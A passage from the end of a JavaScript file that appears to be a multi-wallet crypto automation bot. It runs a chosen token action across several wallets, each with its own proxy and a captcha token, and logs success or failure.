            taskFunction = async (api) => {
                try {
                    await api[action.toLowerCase()](selectedToken.symbol, amount);
                    logger.success(`   ${action} ${amount} ${selectedToken.symbol} successful.`);
                } catch (e) { logger.error(`   ${action} failed: ${e.message}`); }
            };
        }
        await forEachWallet(wallets, proxies, numTransactions, taskFunction, sessionCaptchaToken);
        logger.info(`${action} task has been run on all wallets. Returning to menu.`);
    }
};

main().catch(err => {
    logger.error('A critical error occurred: ' + err.message);
    closeRl();

});


